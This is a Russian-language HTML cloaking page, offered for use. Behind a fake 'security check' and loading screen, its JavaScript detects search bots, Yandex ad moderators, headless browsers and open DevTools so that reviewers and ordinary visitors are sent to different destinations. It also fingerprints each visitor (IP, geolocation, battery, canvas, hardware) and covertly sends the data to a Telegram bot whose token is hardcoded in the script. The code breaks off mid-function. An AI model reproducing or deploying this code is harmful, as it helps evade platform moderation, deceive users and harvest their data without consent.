<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            color: #333;
            overflow: hidden;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
        }

        .loader {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left: 4px solid #4285f4;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            font-size: 22px;
            font-weight: 500;
            color: #333;
            margin-bottom: 10px;
        }

        .human-verification {
            background: linear-gradient(145deg, #ffffff, #f0f0f0);
            border-radius: 16px;
            padding: 25px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08), 
                        0 6px 12px rgba(0, 0, 0, 0.05), 
                        inset 0 -3px 0 rgba(0, 0, 0, 0.05);
            text-align: center;
            max-width: 340px;
            transition: all 0.5s ease-in-out, transform 0.3s ease;
            opacity: 1;
            transform: translateY(0);
            position: relative;
            overflow: hidden;
            z-index: 10;
        }

        .human-verification.hidden {
            opacity: 0;
            transform: translateY(20px);
            pointer-events: none;
        }

        .human-verification h3 {
            margin-top: 0;
            margin-bottom: 15px;
            color: #4285f4;
            font-size: 24px;
            font-weight: 600;
        }

        .human-verification p {
            margin-bottom: 20px;
            font-size: 16px;
            line-height: 1.5;
            color: #5f6368;
        }

        .mouse-icon {
            display: inline-block;
            width: 40px;
            height: 60px;
            border: 3px solid #4285f4;
            border-radius: 20px;
            position: relative;
            margin: 0 auto 15px;
        }

        .mouse-icon:before {
            content: '';
            position: absolute;
            width: 8px;
            height: 8px;
            background: #4285f4;
            border-radius: 50%;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            animation: mousescroll 2s infinite;
        }

        .pulse-effect {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background: radial-gradient(circle, rgba(66, 133, 244, 0.3) 0%, rgba(66, 133, 244, 0) 70%);
            border-radius: 16px;
            opacity: 0;
            animation: pulse 2s infinite;
            pointer-events: none;
        }

        .bot-trap-link {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            font-size: 0;
            height: 0;
            width: 0;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0; }
            50% { transform: scale(1); opacity: 0.6; }
            100% { transform: scale(1.05); opacity: 0; }
        }

        @keyframes mousescroll {
            0% { opacity: 1; top: 10px; }
            50% { opacity: 1; top: 25px; }
            100% { opacity: 0; top: 30px; }
        }

        @keyframes cursor-animation {
            0% { transform: translate(0, 0); }
            25% { transform: translate(10px, 10px); }
            50% { transform: translate(-10px, 10px); }
            75% { transform: translate(5px, -10px); }
            100% { transform: translate(0, 0); }
        }

        /* Стили для мобильных устройств */
        @media (max-width: 768px) {
            .human-verification {
                width: 85%;
                max-width: 300px;
                padding: 20px;
            }
            
            .loader {
                width: 50px;
                height: 50px;
            }
            
            .loading-text {
                font-size: 18px;
            }
            
            .human-verification h3 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="loader"></div>
        <div class="loading-text">Загрузка...</div>
    </div>

    <div class="human-verification">
        <div class="pulse-effect"></div>
        <h3>Проверка безопасности</h3>
        <div class="mouse-icon"></div>
        <p>Пожалуйста, подвигайте курсором, чтобы продолжить</p>
    </div>

    <a href="#" class="bot-trap-link">Секретная ссылка только для ботов</a>

    <!-- Yandex.Metrika counter -->
    <script type="text/javascript" >
        (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
        m[i].l=1*new Date();
        for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
        k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
        (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

        ym(101122135, "init", {
            clickmap:true,
            trackLinks:true,
            accurateTrackBounce:true,
            webvisor:true
        });
    </script>
    <noscript><div><img src="https://mc.yandex.ru/watch/101122135" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
    <!-- /Yandex.Metrika counter -->

    <script>
    (async function() {
        'use strict';

        // ===== КОНСТАНТЫ И ИНИЦИАЛИЗАЦИЯ =====
        const PAGE_LOAD_START = performance.now();
        const WHITE_PAGE = 'https://dzen.ru';
        const BLACK_PAGE = 'https://google.com';
        const TELEGRAM_BOT_TOKEN = '7853695428:AAFhxiIHq67-UOQbP7bJ4FrH0EmwtWGswNU';
        const TELEGRAM_CHAT_ID = '1237450939';
        
        // Списки для определения ботов
        const SEARCH_BOT_AGENTS = [
            // Яндекс боты (ТОЛЬКО боты, не обычные пользователи)
            /YandexBot/i, /YandexAccessibilityBot/i, /YandexMobileBot/i, /YandexDirectDyn/i,
            /YandexImages/i, /YandexVideo/i, /YandexVideoParser/i, /YandexMedia/i,
            /YandexBlogs/i, /YandexFavicons/i, /YandexWebmaster/i, /YandexPagechecker/i,
            /YandexImageResizer/i, /YaDirectFetcher/i, /YandexCalendar/i, /YandexSitelinks/i,
            /YandexMetrika/i, /YandexNews/i, /YandexCatalog/i, /YandexMarket/i,
            /YandexVerticals/i, /YandexVertis/i, /YandexSearchShop/i, /YandexOntoDB/i,
            /YandexOntoDBAPI/i, /YandexRCA/i, /YandexSpravBot/i, /YandexScreenshotBot/i,
            /YandexMobileScreenShotBot/i, /YandexAdNet/i, /YandexDirect/i, /YandexTurbo/i,
            /YandexRenderResourcesBot/i, /YandexTracker/i, /YandexPartner/i, /YandexComBot/i,
            
            // Google боты
            /Googlebot/i, /AdsBot-Google/i, /Google-Read-Aloud/i, /DuplexWeb-Google/i,
            /Google Favicon/i, /googleweblight/i, /Storebot-Google/i, /Google-PageRenderer/i,
            /Google-Site-Verification/i, /Google-SearchByImage/i, /GoogleAccessibilityTest/i,
            /GoogleProducer/i, /APIs-Google/i, /Google-Adwords-Instant/i, /FeedFetcher-Google/i,
            /Google-Apps-Script/i,
            
            // Microsoft/Bing боты
            /bingbot/i, /msnbot/i, /BingPreview/i, /AdIdxBot/i, /MicrosoftPreview/i, /MicrosoftSearch/i,
            
            // Другие поисковые боты
            /slurp/i, /duckduckbot/i, /baiduspider/i, /Yahoo! Slurp/i, /YahooSeeker/i,
            /Exabot/i, /facebookexternalhit/i, /ia_archiver/i, 
            /Applebot/i, /archive.org_bot/i, /BuiltWith/i, /Bot.AraTear/i, /BUbiNG/i,
            /Chrome-Lighthouse/i, /Clickagy/i, /CliniqueBot/i, /DomainStatsBot/i, /evc-batch/i,
            
            // Общие паттерны для ботов
            /Crawler/i, /crawler/i, /Spider/i, /spider/i, /archiver/i, /validator/i,
            /parser/i, /reader/i, /indexer/i, /panscient/i, /monitoring/i,
            
            // SEO/Аналитические инструменты
            /semrush/i, /ahrefs/i, /mj12bot/i, /majestic/i, /rogerbot/i, /dotbot/i,
            /screaming/i, /seokicks/i, /sistrix/i, /seobilitybot/i, /seoscanners/i,
            /proximic/i, /pingdom/i, /gtmetrix/i, /pagespeed/i, /webmeup/i, /Catchpoint/i,
            /Riddler/i, /Nessus/i, /datasift/i, /BLEXBot/i, /AspiegelBot/i, /ScoutJet/i,
            
            // Новые боты из 2023
            /bytespider/i, /DeepCrawl/i, /Sogou/i, /MojeekBot/i, 
            /SeznamBot/i, /Mail.RU_Bot/i, /SemrushBot/i, /Qwantify/i, /CensysInspect/i,
            /PetalBot/i, /Cliqzbot/i, /QwantMobile/i, /coccocbot/i, /EarwigBot/i,
            /NetcraftSurveyAgent/i, /weborama-fetcher/i, /BrightSign/i, /Cookiebot/i,
            /DataForSeoBot/i
        ];
        
        // Исключить обычные приложения Яндекса и браузеры
        const YANDEX_REGULAR_APPS = [
            /YaBrowser/i, // Яндекс.Браузер
            /YandexSearch/i, // Яндекс.Поиск
            /Yandex\/[\d\.]+/i, // Яндекс приложение
            /Dzen/i, // Дзен приложение
            /YandexMobileApp/i // Мобильные приложения Яндекса
        ];
        
        // Домены Яндекса для проверки обратного DNS
        const YANDEX_DOMAINS = [
            '.yandex.ru', '.yandex.net', '.yandex.com', '.yandex.by', '.yandex.kz', 
            '.yandex.ua', '.yandex.md', '.yandex.com.tr', '.yandex.com.am'
        ];

        // Флаги состояния
        let botTrapActivated = false;
        let hadMouseMovement = false;
        let pageFullyLoaded = false;
        let redirectInitiated = false;
        let mouseMoveTimeout = null;
        let redirectTimeout = null;
        let userInfo = null;
        
        // Получение ссылки на блок проверки человека
        const humanVerificationBlock = document.querySelector('.human-verification');
        
        // Определение типа устройства
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        // Счетчик визитов
        let visitCount = parseInt(localStorage.getItem('visitCount') || '0') + 1;
        localStorage.setItem('visitCount', visitCount.toString());

        // Конфигурация по умолчанию
        let config = {
            common: {
                TelegramReporting: true
            },
            desktop: {
                CheckSearchBots: true,
                CheckHeadlessBrowser: true,
                CheckYandexModerator: true,
                CheckYandexBot: true,
                CheckIpBlacklist: true,
                CheckDevTools: true,
                CheckMouseMovement: true,
                CheckVisitFrequency: true,
                MouseMovementTimeout: 7000,
                RedirectDelay: 500,
                MaxVisitsBeforeBlock: 5,
                BlockDuration: 3600000
            },
            mobile: {
                CheckSearchBots: true,
                CheckHeadlessBrowser: true,
                CheckYandexModerator: true,
                CheckYandexBot: true,
                CheckIpBlacklist: true,
                CheckDevTools: false,
                CheckMouseMovement: false,
                CheckVisitFrequency: false,
                RedirectDelay: 1000,
                MaxVisitsBeforeBlock: 10,
                BlockDuration: 3600000
            },
            experimental: {
                CheckAdBlocker: false,
                CheckVirtualMachine: false,
                CheckTorNetwork: false,
                CheckVPN: false,
                PerformTimingAttacks: false,
                CheckWebRTCLeakage: false
            }
        };

        // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====

        /**
         * Асинхронная загрузка файла
         */
        async function loadFile(url) {
            try {
                const response = await fetch(url);
                if (!response.ok) {
                    throw new Error(`Ошибка загрузки файла ${url}: ${response.statusText}`);
                }
                return await response.text();
            } catch (error) {
                console.error(`Не удалось загрузить файл ${url}:`, error);
                return null;
            }
        }

        /**
         * Парсинг конфигурационного файла
         */
        function parseConfig(configText) {
            if (!configText) return;

            let currentSection = 'common';
            const lines = configText.split('\n');

            for (const line of lines) {
                const trimmedLine = line.trim();
                
                // Пропускаем пустые строки и комментарии
                if (!trimmedLine || trimmedLine.startsWith('#')) continue;
                
                // Обработка секций [Desktop], [Mobile], [Experimental]
                if (trimmedLine.startsWith('[')) {
                    const sectionMatch = trimmedLine.match(/\[(.*?)\]/);
                    if (sectionMatch) {
                        currentSection = sectionMatch[1].toLowerCase();
                    }
                    continue;
                }
                
                // Обработка параметров (ключ=значение)
                const parts = trimmedLine.split('=');
                if (parts.length === 2) {
                    const key = parts[0].trim();
                    const value = parts[1].trim().toLowerCase();
                    
                    // Определяем секцию конфигурации
                    let targetSection;
                    if (currentSection === 'desktop') {
                        targetSection = config.desktop;
                    } else if (currentSection === 'mobile') {
                        targetSection = config.mobile;
                    } else if (currentSection === 'experimental') {
                        targetSection = config.experimental;
                    } else {
                        targetSection = config.common;
                    }
                    
                    // Устанавливаем значение параметра
                    if (value === 'on' || value === 'true') {
                        targetSection[key] = true;
                    } else if (value === 'off' || value === 'false') {
                        targetSection[key] = false;
                    } else if (!isNaN(parseInt(value))) {
                        targetSection[key] = parseInt(value);
                    } else {
                        targetSection[key] = value;
                    }
                }
            }
        }

        /**
         * Получение параметра из URL
         */
        function getUrlParameter(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        /**
         * Отслеживание частоты визитов
         */
        function trackVisits() {
            const now = Date.now();
            const visits = JSON.parse(localStorage.getItem('recentVisits') || '[]');
            
            // Удаляем старые визиты (старше 30 минут)
            const recentVisits = visits.filter(timestamp => now - timestamp < 30 * 60 * 1000);
            
            // Добавляем текущий визит
            recentVisits.push(now);
            localStorage.setItem('recentVisits', JSON.stringify(recentVisits));
            
            return recentVisits.length;
        }

        /**
         * Проверка, заблокирован ли пользователь по частоте
         */
        function isBlockedByFrequency() {
            // Проверяем состояние onoff.txt
            if (typeof onOffState !== 'undefined' && onOffState === 'off') {
                return false;
            }

            const currentConfig = isMobile ? config.mobile : config.desktop;
            if (!currentConfig.CheckVisitFrequency) return false;

            // Проверяем блокировку
            const blockExpiry = parseInt(localStorage.getItem('blockExpiry') || '0');
            if (blockExpiry > Date.now()) {
                return true;
            }

            // Проверяем частоту визитов
            const visitCount = trackVisits();
            const maxVisits = currentConfig.MaxVisitsBeforeBlock;
            
            if (visitCount > maxVisits) {
                // Устанавливаем блокировку на заданное время
                localStorage.setItem('blockExpiry', (Date.now() + currentConfig.BlockDuration).toString());
                return true;
            }
            
            return false;
        }

        /**
         * Получение IP-адреса пользователя через несколько сервисов
         */
        async function getIpAddress() {
            const services = [
                { url: 'https://api.ipify.org?format=json', extract: data => data.ip },
                { url: 'https://ipinfo.io/json', extract: data => data.ip },
                { url: 'https://api.myip.com', extract: data => data.ip },
                { url: 'https://ipapi.co/json/', extract: data => data.ip }
            ];

            for (const service of services) {
                try {
                    const response = await fetch(service.url);
                    if (response.ok) {
                        const data = await response.json();
                        return service.extract(data);
                    }
                } catch (error) {
                    console.error(`Ошибка при получении IP через ${service.url}:`, error);
                }
            }

            return "Не определено";
        }

        /**
         * Получение Canvas Fingerprint
         */
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;

                // Заполнение канваса текстом и фигурами
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#00f';
                ctx.fillText('Canvas Fingerprint 👋', 2, 2);
                ctx.fillStyle = '#f00';
                ctx.arc(50, 30, 15, 0, Math.PI * 2, true);
                ctx.fill();

                return canvas.toDataURL().substring(0, 100) + '...';
            } catch (e) {
                return "Canvas недоступен";
            }
        }

        /**
         * Получение информации о батарее
         */
        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API недоступен";
            
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            } catch (e) {
                return "Ошибка доступа";
            }
        }

        /**
         * Информация о памяти устройства
         */
        function getDeviceMemory() {
            if (navigator.deviceMemory) {
                return `${navigator.deviceMemory}GB`;
            }
            return "Не определено";
        }

        /**
         * Информация о сетевом подключении
         */
        function getConnectionInfo() {
            const connection = navigator.connection || 
                              navigator.mozConnection || 
                              navigator.webkitConnection;
            
            if (connection) {
                return {
                    type: connection.effectiveType || "unknown",
                    rtt: connection.rtt || "unknown"
                };
            }
            
            return "Не определено";
        }

        /**
         * Сбор полной информации о пользователе
         */
        async function collectUserInfo() {
            const now = performance.now();
            const loadTime = Math.round(now - PAGE_LOAD_START);
            const battery = await getBatteryInfo();
            const ipAddress = await getIpAddress();
            
            // Базовая информация о посещении
            const info = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(',') : "Не определено",
                platform: navigator.platform,
                deviceType: isMobile ? 'Мобильное устройство' : 'Десктоп',
                visitCount: visitCount,
                
                // Информация об экране и окне
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                
                // Сетевая информация
                url: window.location.href,
                referrer: document.referrer || "none",
                
                // Хранилища и куки
                cookiesEnabled: navigator.cookieEnabled,
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                
                // Производительность и оборудование
                hardwareConcurrency: navigator.hardwareConcurrency || "Не определено",
                memory: getDeviceMemory(),
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connection: getConnectionInfo(),
                
                // Доп. информация о браузере
                doNotTrack: navigator.doNotTrack || "Не определено",
                webdriver: !!navigator.webdriver,
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || "Не определено",
                
                // Уникальные идентификаторы
                canvas: getCanvasFingerprint(),
                
                // Информация о поведении
                hadMouseMovement: hadMouseMovement,
                botTrapActivated: botTrapActivated,
                
                // Дополнительные данные
                battery: battery,
                loadTime: loadTime,
                ipAddress: ipAddress,
                geolocation: "Не определено" // Заполняется позже, если возможно
            };

            // Попытка получить геолокацию
            try {
                const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                if (geoResponse.ok) {
                    const geoData = await geoResponse.json();
                    info.geolocation = `${geoData.city || ""}, ${geoData.country_name || ""}`;
                }
            } catch (e) {
                console.error("Ошибка при получении геолокации:", e);
            }

            return info;
        }

        /**
         * Отправка отчета в Telegram
         */
        async function sendTelegramReport(reason, data) {
            if (!config.common.TelegramReporting) return;

            // Формируем сообщение для Telegram
            let message = `🪤 КЛОАКА: ЛОВУШКА СРАБОТАЛА\n\n`;
            message += `⚠️ Причина: ${reason}\n\n`;
            message += `📱 Тип устройства: ${data.deviceType}\n`;
            message += `🔢 Счетчик посещений: ${data.visitCount}\n`;
            message += `🌐 IP: ${data.ipAddress}\n`;
            message += `📍 Геолокация: ${data.geolocation}\n`;
            message += `🖥️ User-Agent: ${data.userAgent}\n`;
            message += `📏 Экран: ${data.screen.width}x${data.screen.height} (${data.screen.pixelRatio}x)\n`;
            message += `⏱️ Время загрузки: ${data.loadTime}мс\n`;
            message += `🔗 URL: ${data.url}\n`;
            message += `↩️ Referrer: ${data.referrer}\n\n`;
            
            message += `🖱️ Движение мыши: ${data.hadMouseMovement ? 'yes' : 'no'}\n`;
            message += `🔋 Батарея: ${typeof data.battery === 'object' ? `Заряд: ${data.battery.level}%, Заряжается: ${data.battery.charging ? 'да' : 'нет'}` : data.battery}\n`;
            message += `🧠 Ядра CPU: ${data.hardwareConcurrency}\n`;
            message += `💾 Память: ${data.memory}\n`;
            message += `🌍 Язык: ${data.language}\n`;
            message += `⏰ Часовой пояс: ${data.timeZone}\n`;
            message += `🔌 Соединение: ${typeof data.connection === 'object' ? `${data.connection.type} (RTT: ${data.connection.rtt})` : data.connection}\n`;
            message += `🤖 WebDriver: ${data.webdriver ? 'yes' : 'no'}\n`;
            message += `🎨 Canvas: ${data.canvas}`;

            // Создаем URL для отправки сообщения через API Telegram
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            // Отправляем отчет
            try {
                // Пробуем использовать fetch
                if (window.fetch) {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });
                    return response.ok;
                } else {
                    // Резервный вариант через XMLHttpRequest
                    return new Promise((resolve) => {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.onload = () => resolve(xhr.status >= 200 && xhr.status < 300);
                        xhr.onerror = () => resolve(false);
                        xhr.send(JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        }));
                    });
                }
            } catch (error) {
                console.error("Ошибка при отправке отчета в Telegram:", error);
                return false;
            }
        }

        // ===== ФУНКЦИИ ПРОВЕРОК БОТОВ/МОДЕРАТОРОВ =====

        /**
         * Проверка, является ли пользователь легитимным пользователем Яндекс.Браузера или приложения
         */
        function isRegularYandexUser() {
            const ua = navigator.userAgent;
            return YANDEX_REGULAR_APPS.some(pattern => pattern.test(ua));
        }

        /**
         * Проверка, является ли User-Agent ботом (с исключением обычных пользователей Яндекса)
         */
        function isSearchBot() {
            // Если это обычный пользователь Яндекс.Браузера или приложения, не считаем его ботом
            if (isRegularYandexUser()) {
                return false;
            }
            
            const ua = navigator.userAgent;
            return SEARCH_BOT_AGENTS.some(pattern => pattern.test(ua));
        }

        /**
         * Проверка признаков headless-браузера
         */
        function isHeadlessBrowser() {
            // Если это обычный пользователь Яндекс.Браузера или приложения, не выполняем эту проверку
            if (isRegularYandexUser()) {
                return false;
            }
            
            // Проверка WebDriver
            if (navigator.webdriver) return true;
            
            // Проверка наличия объектов автоматизации
            if (window.domAutomation || window.domAutomationController) return true;
            
            // Проверка на Phantom JS
            if (window._phantom || window.callPhantom) return true;
            
            // Проверка на Selenium
            if (document.documentElement.getAttribute('webdriver') || 
                document.documentElement.getAttribute('selenium') || 
                document.documentElement.getAttribute('driver')) {
                return true;
            }
            
            // Проверка на Puppeteer/Playwright
            if (navigator.userAgent.includes('HeadlessChrome')) return true;
            
            // Дополнительные проверки на особенности headless браузеров
            try {
                // Проверка плагинов (headless обычно имеет 0 плагинов)
                if (navigator.plugins.length === 0 && !isMobile) {
                    // У Яндекс Браузера и других могут быть свои особенности с плагинами
                    const ua = navigator.userAgent.toLowerCase();
                    if (!ua.includes('yabrowser') && !ua.includes('yandex') && !ua.includes('dzen')) {
                        return true;
                    }
                }
                
                // Проверка языков (headless обычно имеет пустой список)
                if (navigator.languages.length === 0) return true;
            } catch (e) {
                // Если возникла ошибка при доступе к свойствам, это может быть признаком эмуляции
                return true;
            }
            
            return false;
        }

        /**
         * Проверка наличия iframe модерации Яндекса
         */
        function hasYandexModeratorIframe() {
            // Проверка текущих iframe
            const iframes = document.querySelectorAll('iframe');
            for (const iframe of iframes) {
                const src = iframe.src || '';
                if (src.includes('iframe-yang.yandex') || 
                    src.includes('yandex.ru/iframe/mod') || 
                    src.includes('webvisor.com/mod') ||
                    src.includes('yandex.ru/moderation')) {
                    return true;
                }
            }
            
            // Проверка специфичных JS-объектов модерации Яндекса
            if (typeof window.YaModerator !== 'undefined' || 
                typeof window.YaModeration !== 'undefined') {
                return true;
            }
            
            return false;
        }

        /**
         * Настройка наблюдателя за DOM для обнаружения iframe модерации
         */
        function setupModerationFrameObserver() {
            try {
                const observer = new MutationObserver((mutations) => {
                    for (const mutation of mutations) {
                        if (mutation.type === 'childList') {
                            for (const node of mutation.addedNodes) {
                                if (node.tagName === 'IFRAME') {
                                    const src = node.src || '';
                                    if (src.includes('iframe-yang.yandex') || 
                                        src.includes('yandex.ru/iframe/mod') || 
                                        src.includes('webvisor.com/mod') ||
                                        src.includes('yandex.ru/moderation')) {
                                        botTrapActivated = true;
                                    }
                                }
                            }
                        }
                    }
                });
                
                observer.observe(document.body, { childList: true, subtree: true });
            } catch (e) {
                console.error("Ошибка при установке наблюдателя за iframe:", e);
            }
        }

        /**
         * Комплексная проверка на бота Яндекса (с исключением обычных пользователей)
         */
        async function isYandexBot() {
            // Если это обычный пользователь Яндекс.Браузера или приложения, не считаем его ботом
            if (isRegularYandexUser()) {
                return false;
            }
            
            // Проверка User-Agent на наличие явных признаков бота (не пользователя)
            const ua = navigator.userAgent;
            const strictYandexBotPattern = /YandexBot|YandexAccessibilityBot|YandexMobileBot|YandexDirectDyn|YandexImages|YandexVideo|YandexVideoParser|YandexMedia|YandexBlogs|YandexFavicons|YandexWebmaster|YandexPagechecker|YandexImageResizer|YaDirectFetcher|YandexCalendar|YandexSitelinks|YandexMetrika|YandexNews|YandexCatalog|YandexMarket|YandexVerticals|YandexVertis|YandexSearchShop|YandexOntoDB|YandexOntoDBAPI|YandexRCA|YandexSpravBot|YandexScreenshotBot|YandexMobileScreenShotBot|YandexAdNet|YandexDirect|YandexTurbo|YandexRenderResourcesBot|YandexTracker|YandexPartner|YandexComBot|MirrorDetector/i;
            
            if (strictYandexBotPattern.test(ua)) return true;
            
            // Проверка iframe модерации
            if (hasYandexModeratorIframe()) return true;
            
            // Проверка диапазонов IP Яндекса (только если это действительно похоже на бота)
            if ((/bot|crawler|spider/i.test(ua))) {
                try {
                    const ip = await getIpAddress();
                    if (!ip || ip === "Не определено") return false;
                    
                    // Проверяем, принадлежит ли IP Яндексу через DNS lookup
                    try {
                        const response = await fetch(`https://dns.google/resolve?name=${ip.split('.').reverse().join('.')}.in-addr.arpa&type=PTR`);
                        if (response.ok) {
                            const data = await response.json();
                            if (data.Answer && data.Answer.length > 0) {
                                const ptr = data.Answer[0].data;
                                return YANDEX_DOMAINS.some(domain => ptr.includes(domain));
                            }
                        }
                    } catch (e) {
                        console.error("Ошибка при проверке обратного DNS:", e);
                    }
                    
                    // Дополнительная проверка через сервис определения организации по IP
                    try {
                        const orgResponse = await fetch(`https://ipapi.co/${ip}/org/`);
                        if (orgResponse.ok) {
                            const org = await orgResponse.text();
                            return org.toLowerCase().includes('yandex');
                        }
                    } catch (e) {
                        console.error("Ошибка при проверке организации IP:", e);
                    }
                } catch (e) {
                    console.error("Ошибка при проверке IP Яндекса:", e);
                }
            }
            
            return false;
        }

        /**
         * Проверка, находится ли IP в черном списке
         */
        async function isIpBlocked() {
            try {
                const ipAddress = await getIpAddress();
                if (!ipAddress || ipAddress === "Не определено") return false;
                
                const blacklist = await loadFile('blckip.txt');
                if (!blacklist) return false;
                
                const blockedIps = blacklist.split('\n').map(ip => ip.trim()).filter(ip => ip);
                return blockedIps.includes(ipAddress);
            } catch (e) {
                console.error("Ошибка при проверке черного списка IP:", e);
                return false;
            }
        }

        /**
         * Проверка признаков модератора или разработчика
         */
        function isLikelyModerator() {
            // Если это обычный пользователь Яндекс.Браузера или приложения, снижаем строгость проверки
            const isYandexRegularUser = isRegularYandexUser();
            
            // Проверка DevTools по размеру окна (более мягкие критерии для Яндекс.Браузера)
            const minWidthDiff = isYandexRegularUser ? 150 : 100;
            const minHeightDiff = isYandexRegularUser ? 150 : 100;
            
            if (window.outerWidth - window.innerWidth > minWidthDiff || 
                window.outerHeight - window.innerHeight > minHeightDiff) {
                return true;
            }
            
            // Проверка на WebDriver
            if (navigator.webdriver) return true;
            
            // Проверка на расширения для разработчиков
            if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined' || 
                typeof __REDUX_DEVTOOLS_EXTENSION__ !== 'undefined') {
                return true;
            }
            
            // Проверка времени выполнения console.log (timing attack для определения открытой консоли)
            let slowConsole = false;
            
            // Для Яндекс.Браузера пропускаем эту проверку или делаем ее более мягкой
            if (!isYandexRegularUser) {
                const start = performance.now();
                console.log('');
                console.clear();
                const end = performance.now();
                // Если выполнение заняло более 5мс, возможно консоль открыта
                if (end - start > 5) {
                    slowConsole = true;
                }
            }
            
            return slowConsole;
        }

        // ===== ЭКСПЕРИМЕНТАЛЬНЫЕ ПРОВЕРКИ =====

        /**
         * Определение блокировщика рекламы
         */
        function detectAdblocker() {
            if (!config.experimental.CheckAdBlocker) return false;
            
            try {
                // Создаем тестовый элемент, который блокировщики обычно скрывают
                const testAd = document.createElement('div');
                testAd.innerHTML = ' ';
                testAd.className = 'adsbox';
                document.body.appendChild(testAd);
                
                // Проверяем, скрыт ли элемент
                const isBlocked = testAd.offsetHeight === 0;
                document.body.removeChild(testAd);
                return isBlocked;
            } catch (e) {
                return false;
            }
        }

        /**
         * Определение виртуальной машины
         */
        function checkForVirtualMachine() {
            if (!config.experimental.CheckVirtualMachine) return false;
            
            // Если это обычный пользователь Яндекс.Браузера, пропускаем эту проверку
            if (isRegularYandexUser()) return false;
            
            // Виртуальные машины часто имеют низкое количество ядер и память
            if (navigator.hardwareConcurrency <= 1) return true;
            if (navigator.deviceMemory && navigator.deviceMemory <= 1) return true;
            
            // Проверка специфичных паттернов в User-Agent
            const ua = navigator.userAgent;
            if (ua.includes('VMware') || ua.includes('VirtualBox')) return true;
            
            return false;
        }

        /**
         * Определение сети Tor
         */
        async function checkTorNetwork() {
            if (!config.experimental.CheckTorNetwork) return false;
            
            // Проверка через внешний сервис
            try {
                const response = await fetch('https://check.torproject.org/api/ip');
                if (response.ok) {
                    const data = await response.json();
                    return data.IsTor === true;
                }
            } catch (e) {
                console.error("Ошибка при проверке Tor:", e);
            }
            
            // Резервная проверка по признакам браузера Tor
            const ua = navigator.userAgent;
            if (ua.includes('Tor') || navigator.plugins.length === 0 && 
                window.screen.width === 1000 && window.screen.height === 1000) {
                return true;
            }
            
            return false;
        }

        /**
         * Определение прокси или VPN
         */
        async function detectProxiesOrVPN() {
            if (!config.experimental.CheckVPN) return false;
            
            try {
                // Запрос к сервису определения прокси
                const ip = await getIpAddress();
                if (!ip || ip === "Не определено") return false;
                
                const response = await fetch(`https://ipqualityscore.com/api/json/ip/${ip}?strictness=0&lightweight=true&mobile=true`);
                if (response.ok) {
                    const data = await response.json();
                    return data.proxy || data.vpn || data.tor;
                }
            } catch (e) {
                console.error("Ошибка при проверке прокси/VPN:", e);
            }
            
            return false;
        }

        /**
         * Проверка WebRTC для обнаружения VPN
         */
        async function checkWebRTCLeakage() {
            if (!config.experimental.CheckWebRTCLeakage) return false;
            
            // Для проверки расхождений между публичным IP и локальным IP через WebRTC
            return new Promise((resolve) => {
                try {
                    // Получаем локальные IP-адреса через WebRTC
                    const pc = new RTCPeerConnection({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    
                    pc.createDataChannel('');
                    pc.onicecandidate = (ice) => {
                        if (!ice.candidate) {
                            pc.close();
                            resolve(false);
                            return;
                        }
                        
